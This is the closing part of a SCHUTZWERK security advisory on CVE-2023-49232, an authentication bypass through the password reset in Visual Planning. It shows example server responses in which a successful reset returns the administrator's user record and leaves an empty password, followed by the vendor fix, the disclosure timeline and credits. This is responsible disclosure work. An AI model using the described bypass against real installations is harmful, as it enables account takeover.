<HashtableValue>
<key>ERROR</key>
<value class="String">Invalid code.</value>
</HashtableValue>
</resultValues>
<status>KO</status>
</com.visualplanning.query.QueryResult>

In case the pin is valid, the server responds with a VPUser data structure similar to the following:

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.QueryResult>
<resultValues>
<HashtableValue>
<key>vpUser</key>
<value class="com.visualplanning.data.admin.VPUser">
<ID>1</ID>
<UID>C442-53EB-B185-8804-F6BF-70AC-61C3-31BC</UID>
<activated>true</activated>
<comments>Super administrateur</comments>
<email>yahd6Coo@schutzwerk.com</email>
<expiredPasswd>false</expiredPasswd>
<groups/>
<imageProfilBase64></imageProfilBase64>
<ldapSetting>
<entityID>-1</entityID>
</ldapSetting>
<licenses/>
<loginAttemps>0</loginAttemps>
<mobilePhoneNumber></mobilePhoneNumber>
<name>admin</name>
<ownerID>0</ownerID>
<phoneNumber></phoneNumber>
<platform>VP</platform>
<resetPasswd>true</resetPasswd>
<resourceUser>false</resourceUser>
</value>
</HashtableValue>
</resultValues>
<status>OK</status>
</com.visualplanning.query.QueryResult>

In addition, an empty password is set for the target username. Upon first login after reset, a new password must be set for this user.

Solution/Mitigation
===================

The vendor suggests to update to Visual Planning 8 (Build 240207)

Disclosure timeline
===================

2023-11-01: Vulnerability discovered
2023-11-09: Contact vendor in order to determine security contact
2023-11-10: Received generic sales response from vendor
2023-11-14: Contacted CTO of vendor directly
2023-11-16: Vulnerabilities demonstrated in call with contact at vendor
2023-11-24: CVE assigned by Mitre
2023-11-24: Additional technical details provided to vendor
2023-12-19: Vendor informed SCHUTZWERK that work on fixing the findings is in progress
2024-01-30: Inquired about mitigation status regarding the reported vulnerabilities
2024-01-30: Vendor informed SCHUTZWERK that some of the issues were already fixed
2024-03-08: Sent advisory drafts to vendor
2024-03-28: Received patch information and release of advisory

Contact/Credits
===============

The vulnerability was discovered during an assessment by Lennert Preuth and David Brown of SCHUTZWERK GmbH.

References
==========

[0] https://www.visual-planning.com/en/
[1] https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html

Disclaimer
==========

The information provided in this security advisory is provided "as is" and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible. The most recent version of this security advisory can be found at SCHUTZWERK GmbH's website ( https://www.schutzwerk.com ).

Additional information
======================

SCHUTZWERK Advisories: https://www.schutzwerk.com/blog/tags/advisories/

SCHUTZWERK Advisory Policy: https://www.schutzwerk.com/en/advisories/
-----BEGIN PGP SIGNATURE-----

iQJOBAEBCgA4FiEEgLsg7Oj/wY3LSF87GrXfkTIXLrsFAmYF0TAaHGFkdmlzb3Jp
ZXNAc2NodXR6d2Vyay5jb20ACgkQGrXfkTIXLrtU9xAArJL5rKh3sNRto6xC7bgj
660J6OALXG9O9qaJo1RHYsVo9287THvSgsPs8/YXZhFNtkccsdxRll3t3UxC3IOU
/h+f612I4lFlk9t0LVH2eu6r8lTw47YLbO9RKoBF0TsysJMnytuM9+BxRyd+nLVo
rfVxmRfUhDKf5odkDz8IeatmMMeI1e7JuGylWtVOkSxdbCsmwEbObrEsCwe74AR4
PKJDVb6tq03q1g5H0yq7QLCMyuN7UBc0Jb/sYkL3hu0m7JlqyCVUfNBaD1pqZvlA
C3b+DnrJHwAPYKr5I4pKfss5Ghh3+yIaS/UIyaIImgS6pyBDOJUHULiMKumZYHCl
r3YWOLAjuTUztRmsktavjgItsf2NsXnBLYMDjZuZtBd6iU7iNKQ4EdbCNt8YCN8w
KmU3ot2Kwjty2aLj7CBdg8Mrc4Rr3PH2PoXWxSEBMWqokoO2zWVft+5BpJ/onU2P
um41+KNb7h7Pf/QVkU1KOZbwAI9tgJvZn2hHXmbQov0w3s0J9dqNoJ4Eu+qVPMAx
+Ug9Qvo3Qh325pDEeqxUhOsPh4dHam97ouDYE3XXLlKk8rar8TjhANAHHO4uUltW
gikWB1VVmGy7XS9lflWE1QLqO8BBK1jZUDU21fWQeAeF64R6NXikj0tkfvjOwwt/
CTQ2Nugk2kdYf5d73FSO9ds=
=PvYR
-----END PGP SIGNATURE-----

```

~ Lennert Preuth, David Brown

## Artikel und Informationen teilen

* [Teilen](https://www.linkedin.com/shareArticle?mini=true&summary=&title=Advisory%3a%20Authentication%20Bypass%20via%20Password%20Reset%20Functionality%20in%20Visual%20Planning%20%28CVE-2023-49232%29&url=https%3a%2f%2fwww.schutzwerk.com%2fblog%2fschutzwerk-sa-2023-004%2f "Auf LinkedIn teilen")
* [Teilen](https://www.xing.com/spi/shares/new?url=https%3a%2f%2fwww.schutzwerk.com%2fblog%2fschutzwerk-sa-2023-004%2f "Auf Xing teilen")
* [Tweet](https://twitter.com/intent/tweet?text=Advisory%3a%20Authentication%20Bypass%20via%20Password%20Reset%20Functionality%20in%20Visual%20Planning%20%28CVE-2023-49232%29&url=https%3a%2f%2fwww.schutzwerk.com%2fblog%2fschutzwerk-sa-2023-004%2f "Auf Twitter teilen")

SCHUTZWERK GmbH

Pfarrer-WeiÃ-Weg 12
89077 Ulm

Poststr. 33
20354 Hamburg

Mail: info@schutzwerk.com
Fon: +49 731 977 191 0

---

Leistungen

[PrÃ¼fung](https://www.schutzwerk.com/pruefung)

[Beratung](https://www.schutzwerk.com/beratung)

[Prozesse](https://www.schutzwerk.com/prozesse)

[FÃ¶rderungen](https://www.schutzwerk.com/foerderungen)

[Referenzen](https://www.schutzwerk.com/referenzen)

[Advisories](https://www.schutzwerk.com/advisories)

---

Unternehmen

[Blog & News](https://www.schutzwerk.com/blog)

[Wir Ã¼ber uns](https://www.schutzwerk.com/wir-ueber-uns)

[Team](https://www.schutzwerk.com/team)

[Partner](https://www.schutzwerk.com/partner)

[Zertifizierungen](https://www.schutzwerk.com/zertifizierung)

---

Karriere

[Freie Stellen](https://www.schutzwerk.com/freie-stellen)

[Warum Bewerben?](https://www.schutzwerk.com/warum-bewerben)

---

Kontakt

[Ansprechpartner](https://www.schutzwerk.com/ansprechpartner)

[Anfahrt und Parken](https://www.schutzwerk.com/anfahrt-und-parken)

[Impressum](https://www.schutzwerk.com/impressum)

[Datenschutz](https://www.schutzwerk.com/datenschutz)

---

Folge uns auf

![](https://l.schutzwerk.com/pp/p.html?idsite=4)

[Kostenfreies ErstgesprÃ¤ch](https://www.schutzwerk.com/ansprechpartner/)
